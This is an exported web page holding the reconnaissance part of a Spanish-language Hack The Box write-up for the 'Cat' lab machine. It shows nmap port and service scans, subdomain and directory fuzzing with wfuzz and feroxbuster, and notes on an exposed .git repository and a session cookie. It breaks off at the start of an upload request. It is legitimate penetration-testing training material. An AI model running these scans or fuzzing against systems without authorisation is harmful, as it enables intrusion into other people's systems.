<!DOCTYPE html> <html><head>
		<title>1 - Recon</title>
		<base href="../../">
		<meta id="root-path" root-path="../../">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0">
		<meta charset="UTF-8">
		<meta name="description" content="HTB - 1 - Recon">
		<meta property="og:title" content="1 - Recon">
		<meta property="og:description" content="HTB - 1 - Recon">
		<meta property="og:type" content="website">
		<meta property="og:url" content="machines/cat/1-recon.html">
		<meta property="og:image" content="machines/cat/imgs/pasted-image-20250206115548.png">
		<meta property="og:site_name" content="HTB">
		<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="lib/rss.xml"><script async="" id="webpage-script" src="lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script type="module" async="" id="graph-view-script" src="lib/scripts/graph-view.js"></script><script async="" id="graph-wasm-script" src="lib/scripts/graph-wasm.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-render-worker-script" src="lib/scripts/graph-render-worker.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="tinycolor-script" src="lib/scripts/tinycolor.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="pixi-script" src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.4.0/pixi.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="minisearch-script" src="https://cdn.jsdelivr.net/npm/minisearch@6.3.0/dist/umd/index.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="lib/media/favicon.png"><script async="" id="graph-data-script" src="lib/scripts/graph-data.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-horizontal-spacing:0.6em;--tree-vertical-spacing:0.6em;--sidebar-margin:12px}.sidebar{height:100%;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));font-size:14px;z-index:10;position:relative;overflow:hidden;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}.sidebar-left{left:0}.sidebar-right{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}body.floating-sidebars .sidebar{position:absolute}.sidebar-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .sidebar-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}.sidebar-left .sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}.sidebar-right .sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar:has(.sidebar-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:2em;width:var(--sidebar-width);top:var(--sidebar-margin);padding-inline:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}.sidebar-left .sidebar-topbar{left:0}.sidebar-right .sidebar-topbar{right:0}.topbar-content{overflow:hidden;overflow:clip;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:0!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}.sidebar-left .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}.sidebar-right .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.sidebar-section-header{margin:0 0 1em 0;text-transform:uppercase;letter-spacing:.06em;font-weight:600}body{transition:background-color var(--color-fade-speed) ease-in-out}.webpage-container{display:flex;flex-direction:row;height:100%;width:100%;align-items:stretch;justify-content:center}.document-container{opacity:1;flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0;transition:opacity .2s ease-in-out}.document-container>.markdown-preview-view{margin:var(--sidebar-margin);margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;background-color:var(--background-primary);transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}.document-container>.markdown-preview-view>.markdown-preview-sizer{padding-bottom:80vh!important;width:100%!important;max-width:var(--line-width)!important;flex-basis:var(--line-width)!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}.markdown-rendered img:not([width]),.view-content img:not([width]){max-width:100%;outline:0}.document-container>.view-content.embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}.document-container>.view-content.embed>*{max-width:100%;max-height:100%;object-fit:contain}:has(> :is(.math,table)){overflow-x:auto!important}.document-container>.view-content{overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){if("file:"!=location.protocol){let e=document.querySelectorAll("include");for(let t=0;t<e.length;t++){let o=e[t],l=o.getAttribute("src");try{const e=await fetch(l);if(!e.ok){console.log("Could not include file: "+l),o?.remove();continue}let t=await e.text(),n=document.createRange().createContextualFragment(t),i=Array.from(n.children);for(let e of i)e.classList.add("hide"),e.style.transition="opacity 0.5s ease-in-out",setTimeout((()=>{e.classList.remove("hide")}),10);o.before(n),o.remove(),console.log("Included file: "+l)}catch(e){o?.remove(),console.log("Could not include file: "+l,e);continue}}}else{if(document.querySelectorAll("include").length>0){var e=document.createElement("div");e.id="error",e.textContent="Web server exports must be hosted on an http / web server to be viewed correctly.",e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.fontSize="1.5em",e.style.fontWeight="bold",e.style.textAlign="center",document.body.appendChild(e),document.querySelector(".document-container")?.classList.remove("hide")}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script"))),l=0;!function e(){let n=o[l];l++,n&&"true"!=n.getAttribute("loaded")||l<o.length&&e(),l<o.length?n.addEventListener("load",e):t()}()}</script><link rel="stylesheet" href="lib/styles/obsidian.css"><link rel="stylesheet" href="lib/styles/theme.css"><link rel="preload" href="lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/main-styles.css"></noscript></head><body class="publish css-settings-manager theme-dark show-inline-title show-ribbon"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="webpage-container workspace"><div class="sidebar-left sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" type="checkbox" id="theme_toggle"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="search-input-container"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div class="search-input-clear-button" aria-label="Clear search"></div></div><include src="lib/html/file-tree.html"></include></div><script defer="">let ls = document.querySelector(".sidebar-left"); ls.classList.add("is-collapsed"); if (window.innerWidth > 768) ls.classList.remove("is-collapsed"); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div><div class="document-container markdown-reading-view hide"><div class="markdown-preview-view markdown-rendered allow-fold-headings allow-fold-lists is-readable-line-width"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><h1 class="page-title heading inline-title" id="1 - Recon"><p dir="auto">1 - Recon</p></h1><div class="el-p"><p dir="auto">Puertos tcp abiertos nmap Syn scan</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token function">sudo</span> nmap <span class="token parameter variable">-sS</span> -p- <span class="token parameter variable">-T4</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-n</span>  <span class="token parameter variable">-v</span> cat.htb 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-06 <span class="token number">11</span>:51 CET
Initiating SYN Stealth Scan at <span class="token number">11</span>:51
Scanning cat.htb <span class="token punctuation">(</span><span class="token number">10.10</span>.11.53<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">65535</span> ports<span class="token punctuation">]</span>
Discovered <span class="token function">open</span> port <span class="token number">80</span>/tcp on <span class="token number">10.10</span>.11.53
Discovered <span class="token function">open</span> port <span class="token number">22</span>/tcp on <span class="token number">10.10</span>.11.53
Completed SYN Stealth Scan at <span class="token number">11</span>:52, <span class="token number">20</span>.10s elapsed <span class="token punctuation">(</span><span class="token number">65535</span> total ports<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> cat.htb <span class="token punctuation">(</span><span class="token number">10.10</span>.11.53<span class="token punctuation">)</span>
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.062s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http

Read data files from: /usr/share/nmap
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">20.20</span> seconds
           Raw packets sent: <span class="token number">65943</span> <span class="token punctuation">(</span><span class="token number">2</span>.901MB<span class="token punctuation">)</span> <span class="token operator">|</span> Rcvd: <span class="token number">65605</span> <span class="token punctuation">(</span><span class="token number">2</span>.625MB<span class="token punctuation">)</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Puertos UDP abiertos</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">None
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Analisis de puertos</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token function">sudo</span> nmap <span class="token parameter variable">-sCV</span> <span class="token parameter variable">-p</span> <span class="token number">22,80</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-v</span> cat.htb
ost is up <span class="token punctuation">(</span><span class="token number">0</span>.040s latency<span class="token punctuation">)</span>.

PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.2p1 Ubuntu 4ubuntu0.11 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">3072</span> <span class="token number">96</span>:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.41 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token operator">|</span> http-methods: 
<span class="token operator">|</span>_  Supported Methods: GET HEAD POST OPTIONS
<span class="token operator">|</span> http-cookie-flags: 
<span class="token operator">|</span>   /: 
<span class="token operator">|</span>     PHPSESSID: 
<span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span>
<span class="token operator">|</span> http-git: 
<span class="token operator">|</span>   <span class="token number">10.10</span>.11.53:80/.git/
<span class="token operator">|</span>     Git repository found<span class="token operator">!</span>
<span class="token operator">|</span>     Repository description: Unnamed repository<span class="token punctuation">;</span> edit this <span class="token function">file</span> <span class="token string">'description'</span> to name the<span class="token punctuation">..</span>.
<span class="token operator">|</span>_    Last commit message: Cat v1 
<span class="token operator">|</span>_http-title: Best Cat Competition
<span class="token operator">|</span>_http-server-header: Apache/2.4.41 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at <span class="token number">11</span>:53
Completed NSE at <span class="token number">11</span>:53, <span class="token number">0</span>.00s elapsed
Initiating NSE at <span class="token number">11</span>:53
Completed NSE at <span class="token number">11</span>:53, <span class="token number">0</span>.00s elapsed
Initiating NSE at <span class="token number">11</span>:53
Completed NSE at <span class="token number">11</span>:53, <span class="token number">0</span>.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">12.20</span> seconds
           Raw packets sent: <span class="token number">2</span> <span class="token punctuation">(</span>88B<span class="token punctuation">)</span> <span class="token operator">|</span> Rcvd: <span class="token number">2</span> <span class="token punctuation">(</span>88B<span class="token punctuation">)</span>

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-h2 heading-wrapper"><h2 data-heading="Nmap Summary" dir="auto" class="heading" id="Nmap_Summary"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Nmap Summary</h2><div class="heading-children"><div class="el-table" dir="ltr" style="overflow-x: auto;"><table>
<thead>
<tr>
<th dir="ltr">Port</th>
<th dir="ltr">Software</th>
<th dir="ltr">Version</th>
<th dir="ltr">Status</th>
</tr>
</thead>
<tbody>
<tr>
<td dir="auto">22</td>
<td dir="ltr">ssh</td>
<td dir="ltr">OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</td>
<td dir="ltr">open</td>
</tr>
<tr>
<td dir="auto">80</td>
<td dir="ltr">http</td>
<td dir="ltr">Apache httpd 2.4.41 ((Ubuntu))</td>
<td dir="ltr">open</td>
</tr>
</tbody>
</table></div></div></div><div class="el-h1 heading-wrapper"><h1 data-heading="Puerto 80" dir="auto" class="heading" id="Puerto_80">Puerto 80</h1><div class="heading-children"><div class="el-pre"><pre class="language-python" tabindex="0"><code data-line="0" class="language-python is-loaded">➜  <span class="token operator">~</span> whatweb http<span class="token punctuation">:</span><span class="token operator">//</span>cat<span class="token punctuation">.</span>htb<span class="token punctuation">:</span><span class="token number">80</span>

http<span class="token punctuation">:</span><span class="token operator">//</span>cat<span class="token punctuation">.</span>htb<span class="token punctuation">:</span><span class="token number">80</span> <span class="token punctuation">[</span><span class="token number">200</span> OK<span class="token punctuation">]</span> Apache<span class="token punctuation">[</span><span class="token number">2.4</span><span class="token number">.41</span><span class="token punctuation">]</span><span class="token punctuation">,</span> Cookies<span class="token punctuation">[</span>PHPSESSID<span class="token punctuation">]</span><span class="token punctuation">,</span> Country<span class="token punctuation">[</span>RESERVED<span class="token punctuation">]</span><span class="token punctuation">[</span>ZZ<span class="token punctuation">]</span><span class="token punctuation">,</span> HTML5<span class="token punctuation">,</span> HTTPServer<span class="token punctuation">[</span>Ubuntu Linux<span class="token punctuation">]</span><span class="token punctuation">[</span>Apache<span class="token operator">/</span><span class="token number">2.4</span><span class="token number">.41</span> <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> IP<span class="token punctuation">[</span><span class="token number">10.10</span><span class="token number">.11</span><span class="token number">.53</span><span class="token punctuation">]</span><span class="token punctuation">,</span> Title<span class="token punctuation">[</span>Best Cat Competition<span class="token punctuation">]</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Vista principal:<br>
<span alt="Pasted image 20250206115548.png" src="Pasted image 20250206115548.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250206115548.png" src="machines/cat/imgs/pasted-image-20250206115548.png"></span></p></div><div class="el-h2 heading-wrapper"><h2 data-heading="Fuzzing" dir="auto" class="heading" id="Fuzzing"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Fuzzing</h2><div class="heading-children"><div class="el-p"><p dir="auto">Hacemos fuzzing de subdominos a ver si encontramos alguno;</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token function">sudo</span> wfuzz <span class="token parameter variable">-c</span> <span class="token parameter variable">-f</span> sub-fighter.txt <span class="token parameter variable">-Z</span> <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <span class="token parameter variable">--sc</span> <span class="token number">200,202</span>,204,301,302,307,403 http://FUZZ.cat.htb:80 
********************************************************
* Wfuzz <span class="token number">3.1</span>.0 - The Web Fuzzer                         *
********************************************************

Target: http://FUZZ.cat.htb:80/
Total requests: <span class="token number">4992</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
ID           Response   Lines    Word       Chars       Payload                                                                                 
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>


^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests<span class="token punctuation">..</span>.

Total time: <span class="token number">975.6446</span>
Processed Requests: <span class="token number">2657</span>
Filtered Requests: <span class="token number">2657</span>
Requests/sec.: <span class="token number">2.723327</span>

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Ningun subdomino encontrado de momento;</p></div><div class="el-p"><p dir="auto">Usamos Feroxbuster para el fuzzing de endpoints en <a rel="noopener nofollow" class="external-link" href="http://cat.htb:80" target="_blank">http://cat.htb:80</a></p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token number">200</span>      GET       41l       83w     1242c http://cat.htb/vote.php
<span class="token number">200</span>      GET      140l      327w     4004c http://cat.htb/join.php
<span class="token number">200</span>      GET      127l      270w     2900c http://cat.htb/css/styles.css
<span class="token number">200</span>      GET      196l      415w     5082c http://cat.htb/winners.php
<span class="token number">200</span>      GET      129l      285w     3075c http://cat.htb/
<span class="token number">200</span>      GET      127l      270w     2900c http://cat.htb/css/styles
<span class="token number">200</span>      GET      304l     1647w   132808c http://cat.htb/img/cat1
<span class="token number">200</span>      GET      904l     5604w   448419c http://cat.htb/img/cat2
<span class="token punctuation">[</span><span class="token comment">####################] - 2m     56163/56163   535/s   http://cat.htb/ </span>
<span class="token punctuation">[</span><span class="token comment">####################] - 2m     56163/56163   535/s   http://cat.htb/uploads/ </span>
<span class="token punctuation">[</span><span class="token comment">####################] - 2m     56163/56163   552/s   http://cat.htb/img/ </span>
<span class="token punctuation">[</span><span class="token comment">####################] - 2m     56163/56163   561/s   http://cat.htb/css/ </span>
<span class="token punctuation">[</span><span class="token comment">####################] - 2m     56163/56163   586/s   http://cat.htb/winners/    </span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-h3 heading-wrapper"><h3 data-heading="/Login.php" dir="auto" class="heading" id="/Login.php"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>/Login.php</h3><div class="heading-children"><div class="el-p"><p dir="auto"><span alt="Pasted image 20250206120226.png" src="Pasted image 20250206120226.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250206120226.png" src="machines/cat/imgs/pasted-image-20250206120226.png"></span><br>
Si pinchamos en <code>Already have an account?</code> nos redirige al endpoint <code>/join.php</code> Pruebo a logearme:<br>
<span alt="Pasted image 20250206120341.png" src="Pasted image 20250206120341.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250206120341.png" src="machines/cat/imgs/pasted-image-20250206120341.png"></span><br>
Parece que el servidor maneja cookies de autenticacion<br>
<span alt="Pasted image 20250206120416.png" src="Pasted image 20250206120416.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250206120416.png" src="machines/cat/imgs/pasted-image-20250206120416.png"></span></p></div><div class="el-pre"><pre class="language-java" tabindex="0"><code data-line="0" class="language-java is-loaded"><span class="token constant">PHPSESSID</span><span class="token operator">:</span><span class="token string">"el281bprg2ti42m6j0htoq4bom"</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="/Contest.php" dir="auto" class="heading" id="/Contest.php"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>/Contest.php</h3><div class="heading-children"><div class="el-p"><p dir="auto">Una vez logueados parece que podemos apuntar a nuestro gato en el concurso a traves del formulario en <code>/contest.php</code> vamos a analizar la subida de imagenes en burp<br>
<span alt="Pasted image 20250206120536.png" src="Pasted image 20250206120536.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250206120536.png" src="machines/cat/imgs/pasted-image-20250206120536.png"></span></p></div><div class="el-p"><p dir="auto">Realizamos el formulario para nuestro gato cyberpunk:<br>
<span alt="Pasted image 20250206120915.png" src="Pasted image 20250206120915.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250206120915.png" src="machines/cat/imgs/pasted-image-20250206120915.png"></span><br>
Request:</p></div><div class="el-pre"><pre class="language-java" tabindex="0"><code data-line="0" class="language-java is-loaded"><span class="token constant">POST</span> <span class="token operator">/</span>contest<span class="token punctuation">.</span>php <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
<span class="token class-name">Host</span><span class="token operator">:</span> cat<span class="token punctuation">.</span>htb
<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token constant">X11</span><span class="token punctuation">;</span> <span class="token class-name">Linux</span> x86_64<span class="token punctuation">;</span> rv<span class="token operator">:</span><span class="token number">128.0</span><span class="token punctuation">)</span> <span class="token class-name">Gecko</span><span class="token operator">/</span><span class="token number">20100101</span> <span class="token class-name">Firefox</span><span class="token operator">/</span><span class="token number">128.0</span>
